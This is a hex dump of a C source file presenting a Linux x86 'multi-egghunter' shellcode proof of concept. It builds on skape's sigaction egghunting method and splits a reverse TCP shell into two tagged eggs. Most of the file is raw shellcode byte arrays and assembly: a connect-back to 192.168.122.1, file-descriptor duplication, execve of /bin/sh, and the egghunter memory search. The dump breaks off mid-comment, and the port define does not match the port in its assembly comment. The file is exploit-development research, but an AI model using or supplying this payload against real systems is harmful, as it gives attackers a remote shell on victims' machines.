00000000  2f 2a 0a 20 20 20 20 54  69 74 6c 65 3a 20 20 20  |/*.    Title:   |
00000010  20 20 20 4d 75 6c 74 69  2d 45 67 67 68 75 6e 74  |   Multi-Egghunt|
00000020  65 72 0a 20 20 20 20 41  75 74 68 6f 72 3a 20 20  |er.    Author:  |
00000030  20 20 20 52 79 61 6e 20  46 65 6e 6e 6f 20 28 40  |   Ryan Fenno (@|
00000040  72 79 61 6e 66 65 6e 6e  6f 29 0a 20 20 20 20 44  |ryanfenno).    D|
00000050  61 74 65 3a 20 20 20 20  20 20 20 32 30 20 53 65  |ate:       20 Se|
00000060  70 74 65 6d 62 65 72 20  32 30 31 33 0a 20 20 20  |ptember 2013.   |
00000070  20 54 65 73 74 65 64 20  6f 6e 3a 20 20 4c 69 6e  | Tested on:  Lin|
00000080  75 78 2f 78 38 36 20 28  55 62 75 6e 74 75 20 31  |ux/x86 (Ubuntu 1|
00000090  32 2e 30 2e 33 29 0a 0a  20 20 20 20 44 65 73 63  |2.0.3)..    Desc|
000000a0  72 69 70 74 69 6f 6e 3a  0a 0a 20 20 20 20 54 68  |ription:..    Th|
000000b0  69 73 20 65 6e 74 72 79  20 72 65 70 72 65 73 65  |is entry represe|
000000c0  6e 74 73 20 61 6e 20 65  78 74 65 6e 73 69 6f 6e  |nts an extension|
000000d0  20 6f 66 20 73 6b 61 70  65 27 73 20 73 69 67 61  | of skape's siga|
000000e0  63 74 69 6f 6e 28 32 29  0a 20 20 20 20 65 67 67  |ction(2).    egg|
000000f0  68 75 6e 74 69 6e 67 20  6d 65 74 68 6f 64 20 5b  |hunting method [|
00000100  31 5d 20 74 6f 20 6d 75  6c 74 69 70 6c 65 20 65  |1] to multiple e|
00000110  67 67 73 2e 20 49 74 20  69 73 20 73 69 6d 69 6c  |ggs. It is simil|
00000120  61 72 20 69 6e 20 73 70  69 72 69 74 0a 20 20 20  |ar in spirit.   |
00000130  20 74 6f 20 42 4a 20 27  53 6b 79 4c 69 6e 65 64  | to BJ 'SkyLined|
00000140  27 20 57 65 76 65 72 27  73 20 6f 6d 65 6c 65 74  |' Wever's omelet|
00000150  20 73 68 65 6c 6c 63 6f  64 65 20 66 6f 72 20 57  | shellcode for W|
00000160  69 6e 33 32 20 5b 32 5d  2e 20 54 68 65 0a 20 20  |in32 [2]. The.  |
00000170  20 20 70 72 6f 6f 66 2d  6f 66 2d 63 6f 6e 63 65  |  proof-of-conce|
00000180  70 74 20 70 72 65 73 65  6e 74 65 64 20 68 65 72  |pt presented her|
00000190  65 20 73 70 6c 69 74 73  20 61 20 72 65 76 65 72  |e splits a rever|
000001a0  73 65 20 54 43 50 20 62  69 6e 64 20 73 68 65 6c  |se TCP bind shel|
000001b0  6c 20 5b 33 5d 0a 20 20  20 20 69 6e 74 6f 20 74  |l [3].    into t|
000001c0  77 6f 20 70 61 72 74 73  2e 20 54 68 65 20 65 67  |wo parts. The eg|
000001d0  67 68 75 6e 74 65 72 20  69 73 20 6e 6f 74 20 6f  |ghunter is not o|
000001e0  6e 6c 79 20 72 65 73 70  6f 6e 73 69 62 6c 65 20  |nly responsible |
000001f0  66 6f 72 20 66 69 6e 64  69 6e 67 0a 20 20 20 20  |for finding.    |
00000200  74 68 65 20 74 77 6f 20  65 67 67 73 2c 20 62 75  |the two eggs, bu|
00000210  74 20 61 6c 73 6f 20 66  6f 72 20 65 78 65 63 75  |t also for execu|
00000220  74 69 6e 67 20 74 68 65  6d 20 69 6e 20 74 68 65  |ting them in the|
00000230  20 63 6f 72 72 65 63 74  20 6f 72 64 65 72 2e 20  | correct order. |
00000240  49 74 0a 20 20 20 20 69  73 20 72 65 61 64 69 6c  |It.    is readil|
00000250  79 20 65 78 74 65 6e 64  61 62 6c 65 20 74 6f 20  |y extendable to |
00000260  61 6e 79 20 28 72 65 61  73 6f 6e 61 62 6c 65 29  |any (reasonable)|
00000270  20 6e 75 6d 62 65 72 20  6f 66 20 65 67 67 73 2e  | number of eggs.|
00000280  0a 0a 20 20 20 20 52 65  66 65 72 65 6e 63 65 73  |..    References|
00000290  3a 0a 0a 20 20 20 20 5b  31 5d 20 73 6b 61 70 65  |:..    [1] skape|
000002a0  2c 20 22 53 61 66 65 6c  79 20 53 65 61 72 63 68  |, "Safely Search|
000002b0  69 6e 67 20 50 72 6f 63  65 73 73 20 56 69 72 74  |ing Process Virt|
000002c0  75 61 6c 20 41 64 64 72  65 73 73 20 53 70 61 63  |ual Address Spac|
000002d0  65 22 2c 0a 20 20 20 20  20 20 20 20 77 77 77 2e  |e",.        www.|
000002e0  68 69 63 6b 2e 6f 72 67  2f 63 6f 64 65 2f 73 6b  |hick.org/code/sk|
000002f0  61 70 65 2f 70 61 70 65  72 73 2f 65 67 67 68 75  |ape/papers/egghu|
00000300  6e 74 2d 73 68 65 6c 6c  63 6f 64 65 2e 70 64 66  |nt-shellcode.pdf|
00000310  0a 20 20 20 20 5b 32 5d  20 57 65 76 65 72 2c 20  |.    [2] Wever, |
00000320  42 65 72 65 6e 64 2d 4a  61 6e 2c 20 22 77 33 32  |Berend-Jan, "w32|
00000330  2d 53 45 48 2d 6f 6d 65  6c 65 74 2d 73 68 65 6c  |-SEH-omelet-shel|
00000340  6c 63 6f 64 65 22 2c 0a  20 20 20 20 20 20 20 20  |lcode",.        |
00000350  68 74 74 70 3a 2f 2f 63  6f 64 65 2e 67 6f 6f 67  |http://code.goog|
00000360  6c 65 2e 63 6f 6d 2f 70  2f 77 33 32 2d 73 65 68  |le.com/p/w32-seh|
00000370  2d 6f 6d 65 6c 65 74 2d  73 68 65 6c 6c 63 6f 64  |-omelet-shellcod|
00000380  65 2f 0a 20 20 20 20 5b  33 5d 20 57 69 6c 6c 69  |e/.    [3] Willi|
00000390  73 2c 20 52 2e 20 22 72  65 76 65 72 73 65 74 63  |s, R. "reversetc|
000003a0  70 62 69 6e 64 73 68 65  6c 6c 22 2c 0a 20 20 20  |pbindshell",.   |
000003b0  20 20 20 20 20 68 74 74  70 3a 2f 2f 73 68 65 6c  |     http://shel|
000003c0  6c 2d 73 74 6f 72 6d 2e  6f 72 67 2f 73 68 65 6c  |l-storm.org/shel|
000003d0  6c 63 6f 64 65 2f 66 69  6c 65 73 2f 73 68 65 6c  |lcode/files/shel|
000003e0  6c 63 6f 64 65 2d 38 34  39 2e 70 68 70 0a 2a 2f  |lcode-849.php.*/|
000003f0  0a 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
00000400  6f 2e 68 3e 0a 0a 23 64  65 66 69 6e 65 20 20 20  |o.h>..#define   |
00000410  20 4d 41 52 4b 45 52 20  20 22 5c 78 39 33 5c 78  | MARKER  "\x93\x|
00000420  35 31 5c 78 39 33 5c 78  35 39 22 0a 23 64 65 66  |51\x93\x59".#def|
00000430  69 6e 65 20 20 20 20 54  41 47 31 20 20 20 20 22  |ine    TAG1    "|
00000440  5c 78 30 31 5c 78 35 31  5c 78 39 33 5c 78 35 39  |\x01\x51\x93\x59|
00000450  22 20 2f 2f 20 65 61 73  69 65 73 74 20 74 6f 20  |" // easiest to |
00000460  75 73 65 20 6c 61 74 74  65 72 20 74 68 72 65 65  |use latter three|
00000470  20 62 79 74 65 73 0a 23  64 65 66 69 6e 65 20 20  | bytes.#define  |
00000480  20 20 54 41 47 32 20 20  20 20 22 5c 78 30 32 5c  |  TAG2    "\x02\|
00000490  78 35 31 5c 78 39 33 5c  78 35 39 22 20 2f 2f 20  |x51\x93\x59" // |
000004a0  6f 66 20 4d 41 52 4b 45  52 20 66 6f 72 20 6c 61  |of MARKER for la|
000004b0  74 74 65 72 20 74 68 72  65 65 20 6f 66 20 54 41  |tter three of TA|
000004c0  47 73 0a 0a 2f 2f 20 66  69 72 73 74 20 65 67 67  |Gs..// first egg|
000004d0  2f 74 61 67 2f 73 68 65  6c 6c 63 6f 64 65 0a 23  |/tag/shellcode.#|
000004e0  64 65 66 69 6e 65 20 20  20 20 49 50 41 44 44 52  |define    IPADDR|
000004f0  20 20 22 5c 78 63 30 5c  78 61 38 5c 78 37 61 5c  |  "\xc0\xa8\x7a\|
00000500  78 30 31 22 20 2f 2f 20  31 39 32 2e 31 36 38 2e  |x01" // 192.168.|
00000510  31 32 32 2e 31 0a 23 64  65 66 69 6e 65 20 20 20  |122.1.#define   |
00000520  20 50 4f 52 54 20 20 20  20 22 5c 78 61 62 5c 78  | PORT    "\xab\x|
00000530  63 64 22 20 20 20 20 20  20 20 20 20 2f 2f 20 34  |cd"         // 4|
00000540  33 39 38 31 0a 75 6e 73  69 67 6e 65 64 20 63 68  |3981.unsigned ch|
00000550  61 72 20 73 68 65 6c 6c  63 6f 64 65 31 5b 5d 20  |ar shellcode1[] |
00000560  3d 0a 4d 41 52 4b 45 52  0a 54 41 47 31 0a 2f 2f  |=.MARKER.TAG1.//|
00000570  53 48 45 4c 4c 43 4f 44  45 31 0a 22 5c 78 33 31  |SHELLCODE1."\x31|
00000580  5c 78 64 62 5c 78 66 37  5c 78 65 33 5c 78 62 30  |\xdb\xf7\xe3\xb0|
00000590  5c 78 36 36 5c 78 34 33  5c 78 35 32 5c 78 35 33  |\x66\x43\x52\x53|
000005a0  5c 78 36 61 5c 78 30 32  5c 78 38 39 5c 78 65 31  |\x6a\x02\x89\xe1|
000005b0  5c 78 63 64 5c 78 38 30  22 0a 22 5c 78 39 36 5c  |\xcd\x80"."\x96\|
000005c0  78 62 30 5c 78 36 36 5c  78 62 33 5c 78 30 33 5c  |xb0\x66\xb3\x03\|
000005d0  78 36 38 22 20 20 20 20  49 50 41 44 44 52 20 20  |x68"    IPADDR  |
000005e0  20 20 22 5c 78 36 36 5c  78 36 38 22 20 50 4f 52  |  "\x66\x68" POR|
000005f0  54 20 22 5c 78 36 36 22  0a 22 5c 78 36 61 5c 78  |T "\x66"."\x6a\x|
00000600  30 32 5c 78 38 39 5c 78  65 31 5c 78 36 61 5c 78  |02\x89\xe1\x6a\x|
00000610  31 30 5c 78 35 31 5c 78  35 36 5c 78 38 39 5c 78  |10\x51\x56\x89\x|
00000620  65 31 5c 78 63 64 5c 78  38 30 22 0a 2f 2f 20 70  |e1\xcd\x80".// p|
00000630  65 72 66 6f 72 6d 20 74  68 65 20 6a 75 6d 70 0a  |erform the jump.|
00000640  22 5c 78 38 33 5c 78 63  34 5c 78 32 30 5c 78 35  |"\x83\xc4\x20\x5|
00000650  66 5c 78 38 33 5c 78 65  63 5c 78 32 34 5c 78 66  |f\x83\xec\x24\xf|
00000660  66 5c 78 65 37 22 0a 3b  0a 2f 2a 0a 67 6c 6f 62  |f\xe7".;./*.glob|
00000670  61 6c 20 5f 73 74 61 72  74 0a 73 65 63 74 69 6f  |al _start.sectio|
00000680  6e 20 2e 74 65 78 74 0a  5f 73 74 61 72 74 3a 0a  |n .text._start:.|
00000690  20 20 20 20 78 6f 72 20  65 62 78 2c 20 65 62 78  |    xor ebx, ebx|
000006a0  0a 20 20 20 20 6d 75 6c  20 65 62 78 0a 0a 20 20  |.    mul ebx..  |
000006b0  20 20 6d 6f 76 20 61 6c  2c 20 30 78 36 36 20 20  |  mov al, 0x66  |
000006c0  20 20 20 20 20 20 20 20  3b 20 73 6f 63 6b 65 74  |        ; socket|
000006d0  63 61 6c 6c 28 29 20 3c  6c 69 6e 75 78 2f 6e 65  |call() <linux/ne|
000006e0  74 2e 68 3e 0a 20 20 20  20 69 6e 63 20 65 62 78  |t.h>.    inc ebx|
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000700  20 73 6f 63 6b 65 74 28  29 0a 20 20 20 20 70 75  | socket().    pu|
00000710  73 68 20 65 64 78 20 20  20 20 20 20 20 20 20 20  |sh edx          |
00000720  20 20 20 20 3b 20 61 72  67 33 20 3a 3a 20 70 72  |    ; arg3 :: pr|
00000730  6f 74 6f 63 6f 6c 20 20  20 20 3d 20 30 0a 20 20  |otocol    = 0.  |
00000740  20 20 70 75 73 68 20 65  62 78 20 20 20 20 20 20  |  push ebx      |
00000750  20 20 20 20 20 20 20 20  3b 20 61 72 67 32 20 3a  |        ; arg2 :|
00000760  3a 20 53 4f 43 4b 5f 53  54 52 45 41 4d 20 3d 20  |: SOCK_STREAM = |
00000770  31 0a 20 20 20 20 70 75  73 68 20 62 79 74 65 20  |1.    push byte |
00000780  30 78 32 20 20 20 20 20  20 20 20 20 3b 20 61 72  |0x2         ; ar|
00000790  67 31 20 3a 3a 20 41 46  5f 49 4e 45 54 20 20 20  |g1 :: AF_INET   |
000007a0  20 20 3d 20 32 0a 20 20  20 20 6d 6f 76 20 65 63  |  = 2.    mov ec|
000007b0  78 2c 20 65 73 70 0a 20  20 20 20 69 6e 74 20 30  |x, esp.    int 0|
000007c0  78 38 30 0a 20 20 20 20  78 63 68 67 20 65 61 78  |x80.    xchg eax|
000007d0  2c 20 65 73 69 20 20 20  20 20 20 20 20 20 3b 20  |, esi         ; |
000007e0  73 61 76 65 20 63 6c 6e  74 5f 73 6f 63 6b 66 64  |save clnt_sockfd|
000007f0  20 69 6e 20 65 73 69 0a  20 20 20 20 6d 6f 76 20  | in esi.    mov |
00000800  61 6c 2c 20 30 78 36 36  20 20 20 20 20 20 20 20  |al, 0x66        |
00000810  20 20 3b 20 73 6f 63 6b  65 74 63 61 6c 6c 28 29  |  ; socketcall()|
00000820  0a 20 20 20 20 6d 6f 76  20 62 6c 2c 20 30 78 33  |.    mov bl, 0x3|
00000830  20 20 20 20 20 20 20 20  20 20 20 3b 20 63 6f 6e  |           ; con|
00000840  6e 65 63 74 28 29 0a 20  20 20 20 20 20 20 20 20  |nect().         |
00000850  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000860  20 3b 20 62 75 69 6c 64  20 73 6f 63 6b 61 64 64  | ; build sockadd|
00000870  72 5f 69 6e 20 73 74 72  75 63 74 20 28 73 72 76  |r_in struct (srv|
00000880  5f 61 64 64 72 29 0a 20  20 20 20 70 75 73 68 20  |_addr).    push |
00000890  64 77 6f 72 64 20 30 78  30 31 37 41 41 38 43 30  |dword 0x017AA8C0|
000008a0  20 3b 20 20 20 49 50 76  34 20 61 64 64 72 65 73  | ;   IPv4 addres|
000008b0  73 20 31 39 32 2e 31 36  38 2e 31 32 32 2e 31 20  |s 192.168.122.1 |
000008c0  69 6e 20 68 65 78 20 28  6c 69 74 74 6c 65 20 65  |in hex (little e|
000008d0  6e 64 69 61 6e 29 0a 20  20 20 20 70 75 73 68 20  |ndian).    push |
000008e0  77 6f 72 64 20 30 78 36  39 37 61 20 20 20 20 20  |word 0x697a     |
000008f0  20 3b 20 20 20 54 43 50  20 70 6f 72 74 20 30 78  | ;   TCP port 0x|
00000900  37 61 36 39 20 3d 20 33  31 33 33 37 0a 20 20 20  |7a69 = 31337.   |
00000910  20 70 75 73 68 20 77 6f  72 64 20 30 78 32 20 20  | push word 0x2  |
00000920  20 20 20 20 20 20 20 3b  20 20 20 41 46 5f 49 4e  |       ;   AF_IN|
00000930  45 54 20 3d 20 32 0a 20  20 20 20 6d 6f 76 20 65  |ET = 2.    mov e|
00000940  63 78 2c 20 65 73 70 20  20 20 20 20 20 20 20 20  |cx, esp         |
00000950  20 3b 20 70 6f 69 6e 74  65 72 20 74 6f 20 73 6f  | ; pointer to so|
00000960  63 6b 61 64 64 72 5f 69  6e 20 73 74 72 75 63 74  |ckaddr_in struct|
00000970  0a 20 20 20 20 70 75 73  68 20 64 77 6f 72 64 20  |.    push dword |
00000980  30 78 31 30 20 20 20 20  20 20 20 3b 20 61 72 67  |0x10       ; arg|
00000990  33 20 3a 3a 20 73 69 7a  65 6f 66 28 73 74 72 75  |3 :: sizeof(stru|
000009a0  63 74 20 73 6f 63 6b 61  64 64 72 29 20 3d 20 31  |ct sockaddr) = 1|
000009b0  36 20 5b 33 32 2d 62 69  74 73 5d 0a 20 20 20 20  |6 [32-bits].    |
000009c0  70 75 73 68 20 65 63 78  20 20 20 20 20 20 20 20  |push ecx        |
000009d0  20 20 20 20 20 20 3b 20  61 72 67 32 20 3a 3a 20  |      ; arg2 :: |
000009e0  70 6f 69 6e 74 65 72 20  74 6f 20 73 6f 63 6b 61  |pointer to socka|
000009f0  64 64 72 5f 69 6e 20 73  74 72 75 63 74 0a 20 20  |ddr_in struct.  |
00000a00  20 20 70 75 73 68 20 65  73 69 20 20 20 20 20 20  |  push esi      |
00000a10  20 20 20 20 20 20 20 20  3b 20 61 72 67 31 20 3a  |        ; arg1 :|
00000a20  3a 20 63 6c 6e 74 5f 73  6f 63 6b 66 64 0a 20 20  |: clnt_sockfd.  |
00000a30  20 20 6d 6f 76 20 65 63  78 2c 20 65 73 70 0a 20  |  mov ecx, esp. |
00000a40  20 20 20 69 6e 74 20 30  78 38 30 0a 0a 20 20 20  |   int 0x80..   |
00000a50  20 3b 2d 2d 2d 2d 20 70  65 72 66 6f 72 6d 20 74  | ;---- perform t|
00000a60  68 65 20 6a 75 6d 70 0a  20 20 20 20 3b 20 6c 6f  |he jump.    ; lo|
00000a70  6f 6b 69 6e 67 20 61 74  20 74 68 65 20 73 74 61  |oking at the sta|
00000a80  63 6b 20 61 74 20 74 68  69 73 20 70 6f 69 6e 74  |ck at this point|
00000a90  2c 20 74 68 65 20 74 61  72 67 65 74 20 66 6f 72  |, the target for|
00000aa0  20 74 68 65 20 6a 75 6d  70 0a 20 20 20 20 3b 20  | the jump.    ; |
00000ab0  69 73 20 61 74 20 24 65  73 70 2b 30 78 32 30 2c  |is at $esp+0x20,|
00000ac0  20 73 6f 2e 2e 2e 0a 20  20 20 20 61 64 64 20 65  | so....    add e|
00000ad0  73 70 2c 20 30 78 32 30  0a 20 20 20 20 70 6f 70  |sp, 0x20.    pop|
00000ae0  20 65 64 69 0a 20 20 20  20 73 75 62 20 65 73 70  | edi.    sub esp|
00000af0  2c 20 30 78 32 34 0a 20  20 20 20 6a 6d 70 20 65  |, 0x24.    jmp e|
00000b00  64 69 0a 2a 2f 0a 0a 2f  2f 20 73 65 63 6f 6e 64  |di.*/..// second|
00000b10  20 65 67 67 2f 74 61 67  2f 73 68 65 6c 6c 63 6f  | egg/tag/shellco|
00000b20  64 65 0a 75 6e 73 69 67  6e 65 64 20 63 68 61 72  |de.unsigned char|
00000b30  20 73 68 65 6c 6c 63 6f  64 65 32 5b 5d 20 3d 0a  | shellcode2[] =.|
00000b40  4d 41 52 4b 45 52 0a 54  41 47 32 0a 2f 2f 53 48  |MARKER.TAG2.//SH|
00000b50  45 4c 4c 43 4f 44 45 32  0a 22 5c 78 35 62 5c 78  |ELLCODE2."\x5b\x|
00000b60  36 61 5c 78 30 32 5c 78  35 39 5c 78 62 30 5c 78  |6a\x02\x59\xb0\x|
00000b70  33 66 5c 78 63 64 5c 78  38 30 5c 78 34 39 5c 78  |3f\xcd\x80\x49\x|
00000b80  37 39 5c 78 66 39 5c 78  33 31 5c 78 63 30 5c 78  |79\xf9\x31\xc0\x|
00000b90  62 30 5c 78 30 62 22 0a  22 5c 78 35 32 5c 78 36  |b0\x0b"."\x52\x6|
00000ba0  38 5c 78 32 66 5c 78 32  66 5c 78 37 33 5c 78 36  |8\x2f\x2f\x73\x6|
00000bb0  38 5c 78 36 38 5c 78 32  66 5c 78 36 32 5c 78 36  |8\x68\x2f\x62\x6|
00000bc0  39 5c 78 36 65 5c 78 38  39 5c 78 65 33 5c 78 35  |9\x6e\x89\xe3\x5|
00000bd0  32 5c 78 38 39 22 0a 22  5c 78 65 32 5c 78 35 33  |2\x89"."\xe2\x53|
00000be0  5c 78 38 39 5c 78 65 31  5c 78 63 64 5c 78 38 30  |\x89\xe1\xcd\x80|
00000bf0  22 0a 3b 0a 2f 2a 0a 67  6c 6f 62 61 6c 20 5f 73  |".;./*.global _s|
00000c00  74 61 72 74 0a 73 65 63  74 69 6f 6e 20 2e 74 65  |tart.section .te|
00000c10  78 74 0a 5f 73 74 61 72  74 3a 0a 20 20 20 20 70  |xt._start:.    p|
00000c20  6f 70 20 65 62 78 20 20  20 20 20 20 20 20 20 20  |op ebx          |
00000c30  20 3b 20 61 72 67 31 20  3a 3a 20 63 6c 6e 74 5f  | ; arg1 :: clnt_|
00000c40  73 6f 63 6b 66 64 0a 20  20 20 20 70 75 73 68 20  |sockfd.    push |
00000c50  30 78 32 0a 20 20 20 20  70 6f 70 20 65 63 78 20  |0x2.    pop ecx |
00000c60  20 20 20 20 20 20 20 20  20 20 3b 20 6c 6f 6f 70  |          ; loop|
00000c70  20 66 72 6f 6d 20 32 20  74 6f 20 30 0a 64 75 70  | from 2 to 0.dup|
00000c80  32 6c 6f 6f 70 3a 0a 20  20 20 20 6d 6f 76 20 62  |2loop:.    mov b|
00000c90  79 74 65 20 61 6c 2c 20  30 78 33 46 20 3b 20 64  |yte al, 0x3F ; d|
00000ca0  75 70 32 28 32 29 0a 20  20 20 20 69 6e 74 20 30  |up2(2).    int 0|
00000cb0  78 38 30 0a 20 20 20 20  64 65 63 20 65 63 78 0a  |x80.    dec ecx.|
00000cc0  20 20 20 20 6a 6e 73 20  64 75 70 32 6c 6f 6f 70  |    jns dup2loop|
00000cd0  20 20 20 20 20 20 3b 20  6c 6f 6f 70 20 65 6e 64  |      ; loop end|
00000ce0  73 20 77 68 65 6e 20 65  63 78 20 3d 3d 20 2d 31  |s when ecx == -1|
00000cf0  0a 20 20 20 20 78 6f 72  20 65 61 78 2c 20 65 61  |.    xor eax, ea|
00000d00  78 0a 20 20 20 20 6d 6f  76 20 62 79 74 65 20 61  |x.    mov byte a|
00000d10  6c 2c 20 30 78 30 42 20  3b 20 65 78 65 63 76 65  |l, 0x0B ; execve|
00000d20  28 32 29 0a 20 20 20 20  70 75 73 68 20 65 64 78  |(2).    push edx|
00000d30  20 20 20 20 20 20 20 20  20 20 3b 20 6e 75 6c 6c  |          ; null|
00000d40  20 74 65 72 6d 69 6e 61  74 6f 72 0a 20 20 20 20  | terminator.    |
00000d50  70 75 73 68 20 30 78 36  38 37 33 32 66 32 66 20  |push 0x68732f2f |
00000d60  20 20 3b 20 22 68 73 2f  2f 22 0a 20 20 20 20 70  |  ; "hs//".    p|
00000d70  75 73 68 20 30 78 36 65  36 39 36 32 32 66 20 20  |ush 0x6e69622f  |
00000d80  20 3b 20 22 6e 69 62 2f  22 0a 20 20 20 20 6d 6f  | ; "nib/".    mo|
00000d90  76 20 65 62 78 2c 20 65  73 70 20 20 20 20 20 20  |v ebx, esp      |
00000da0  3b 20 61 72 67 31 20 3a  3a 20 22 2f 62 69 6e 2f  |; arg1 :: "/bin/|
00000db0  73 68 5c 30 22 0a 20 20  20 20 70 75 73 68 20 65  |sh\0".    push e|
00000dc0  64 78 20 20 20 20 20 20  20 20 20 20 3b 20 6e 75  |dx          ; nu|
00000dd0  6c 6c 20 74 65 72 6d 69  6e 61 74 6f 72 0a 20 20  |ll terminator.  |
00000de0  20 20 6d 6f 76 20 65 64  78 2c 20 65 73 70 20 20  |  mov edx, esp  |
00000df0  20 20 20 20 3b 20 61 72  67 33 20 3a 3a 20 65 6e  |    ; arg3 :: en|
00000e00  76 70 20 3d 20 4e 55 4c  4c 20 61 72 72 61 79 0a  |vp = NULL array.|
00000e10  20 20 20 20 70 75 73 68  20 65 62 78 0a 20 20 20  |    push ebx.   |
00000e20  20 6d 6f 76 20 65 63 78  2c 20 65 73 70 20 20 20  | mov ecx, esp   |
00000e30  20 20 20 3b 20 61 72 67  32 20 3a 3a 20 61 72 67  |   ; arg2 :: arg|
00000e40  76 20 61 72 72 61 79 20  28 70 74 72 20 74 6f 20  |v array (ptr to |
00000e50  73 74 72 69 6e 67 29 0a  20 20 20 20 69 6e 74 20  |string).    int |
00000e60  30 78 38 30 0a 2a 2f 0a  0a 75 6e 73 69 67 6e 65  |0x80.*/..unsigne|
00000e70  64 20 63 68 61 72 20 65  67 67 68 75 6e 74 65 72  |d char egghunter|
00000e80  5b 5d 20 3d 0a 22 5c 78  36 61 5c 78 30 32 5c 78  |[] =."\x6a\x02\x|
00000e90  35 39 5c 78 35 37 5c 78  35 31 5c 78 33 31 5c 78  |59\x57\x51\x31\x|
00000ea0  63 39 5c 78 36 36 5c 78  38 31 5c 78 63 39 5c 78  |c9\x66\x81\xc9\x|
00000eb0  66 66 5c 78 30 66 5c 78  34 31 5c 78 36 61 5c 78  |ff\x0f\x41\x6a\x|
00000ec0  34 33 22 0a 22 5c 78 35  38 5c 78 63 64 5c 78 38  |43"."\x58\xcd\x8|
00000ed0  30 5c 78 33 63 5c 78 66  32 5c 78 37 34 5c 78 66  |0\x3c\xf2\x74\xf|
00000ee0  31 5c 78 62 38 22 20 20  20 20 4d 41 52 4b 45 52  |1\xb8"    MARKER|
00000ef0  20 20 20 20 22 5c 78 38  39 5c 78 63 66 5c 78 61  |    "\x89\xcf\xa|
00000f00  66 22 0a 22 5c 78 37 35  5c 78 65 63 5c 78 38 39  |f"."\x75\xec\x89|
00000f10  5c 78 63 62 5c 78 35 39  5c 78 32 30 5c 78 63 38  |\xcb\x59\x20\xc8|
00000f20  5c 78 61 66 5c 78 35 31  5c 78 38 39 5c 78 64 39  |\xaf\x51\x89\xd9|
00000f30  5c 78 37 35 5c 78 65 31  5c 78 35 39 5c 78 65 32  |\x75\xe1\x59\xe2|
00000f40  22 0a 22 5c 78 64 35 5c  78 66 66 5c 78 65 37 22  |"."\xd5\xff\xe7"|
00000f50  3b 0a 2f 2a 0a 20 20 20  20 67 6c 6f 62 61 6c 20  |;./*.    global |
00000f60  5f 73 74 61 72 74 0a 20  20 20 20 73 65 63 74 69  |_start.    secti|
00000f70  6f 6e 20 2e 74 65 78 74  0a 20 20 20 20 5f 73 74  |on .text.    _st|
00000f80  61 72 74 3a 0a 20 20 20  20 20 20 20 20 70 75 73  |art:.        pus|
00000f90  68 20 62 79 74 65 20 30  78 32 0a 20 20 20 20 20  |h byte 0x2.     |
00000fa0  20 20 20 70 6f 70 20 65  63 78 20 20 20 20 20 20  |   pop ecx      |
00000fb0  20 20 20 20 20 20 20 3b  20 6e 75 6d 62 65 72 20  |       ; number |
00000fc0  6f 66 20 65 67 67 73 0a  20 20 20 20 65 67 67 4c  |of eggs.    eggL|
00000fd0  6f 6f 70 3a 0a 20 20 20  20 20 20 20 20 70 75 73  |oop:.        pus|
00000fe0  68 20 65 64 69 20 20 20  20 20 20 20 20 20 20 20  |h edi           |
00000ff0  20 3b 20 6d 65 6d 6f 72  79 20 6c 6f 63 61 74 69  | ; memory locati|
00001000  6f 6e 20 6f 66 20 65 63  78 2d 74 68 20 70 69 65  |on of ecx-th pie|
00001010  63 65 3b 20 66 69 72 73  74 20 6f 66 0a 20 20 20  |ce; first of.   |
00001020  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001030  20 20 20 20 20 20 20 20  20 3b 20 74 68 65 73 65  |         ; these|
00001040  20 69 73 20 6d 65 61 6e  69 6e 67 6c 65 73 73 0a  | is meaningless.|
00001050  20 20 20 20 20 20 20 20  70 75 73 68 20 65 63 78  |        push ecx|
00001060  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 73 61  |            ; sa|
00001070  76 65 20 63 6f 75 6e 74  65 72 0a 20 20 20 20 20  |ve counter.     |
00001080  20 20 20 78 6f 72 20 65  63 78 2c 20 65 63 78 20  |   xor ecx, ecx |
00001090  20 20 20 20 20 20 20 3b  20 69 6e 69 74 69 61 6c  |       ; initial|
000010a0  69 7a 65 20 65 63 78 20  66 6f 72 20 6d 65 6d 6f  |ize ecx for memo|
000010b0  72 79 20 73 65 61 72 63  68 0a 20 20 20 20 66 69  |ry search.    fi|
000010c0  6c 6c 4f 6e 65 73 3a 0a  20 20 20 20 20 20 20 20  |llOnes:.        |
000010d0  6f 72 20 63 78 2c 20 30  78 66 66 66 0a 20 20 20  |or cx, 0xfff.   |
000010e0  20 73 68 69 66 74 55 70  3a 0a 20 20 20 20 20 20  | shiftUp:.      |
000010f0  20 20 69 6e 63 20 65 63  78 0a 20 20 20 20 20 20  |  inc ecx.      |
00001100  20 20 70 75 73 68 20 62  79 74 65 20 30 78 34 33  |  push byte 0x43|
00001110  20 20 20 20 20 20 3b 20  73 69 67 61 63 74 69 6f  |      ; sigactio|
00001120  6e 28 32 29 0a 20 20 20  20 20 20 20 20 70 6f 70  |n(2).        pop|
00001130  20 65 61 78 0a 20 20 20  20 20 20 20 20 69 6e 74  | eax.        int|
00001140  20 30 78 38 30 0a 20 20  20 20 20 20 20 20 63 6d  | 0x80.        cm|
00001150  70 20 61 6c 2c 20 30 78  66 32 0a 20 20 20 20 20  |p al, 0xf2.     |
00001160  20 20 20 6a 7a 20 66 69  6c 6c 4f 6e 65 73 0a 20  |   jz fillOnes. |
00001170  20 20 20 20 20 20 20 6d  6f 76 20 65 61 78 2c 20  |       mov eax, |
00001180  30 78 35 39 39 33 35 31  39 33 20 3b 20 6d 61 72  |0x59935193 ; mar|
00001190  6b 65 72 0a 20 20 20 20  20 20 20 20 6d 6f 76 20  |ker.        mov |
000011a0  65 64 69 2c 20 65 63 78  0a 20 20 20 20 20 20 20  |edi, ecx.       |
000011b0  20 73 63 61 73 64 20 20  20 20 20 20 20 20 20 20  | scasd          |
000011c0  20 20 20 20 20 3b 20 61  64 76 61 6e 63 65 73 20  |     ; advances |
000011d0  65 64 69 20 62 79 20 30  78 34 20 69 66 20 74 68  |edi by 0x4 if th|
000011e0  65 72 65 20 69 73 20 61  20 6d 61 74 63 68 3b 0a  |ere is a match;.|
000011f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001200  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 61 73  |            ; as|
00001210  73 75 6d 65 73 20 64 69  72 65 63 74 69 6f 6e 20  |sumes direction |
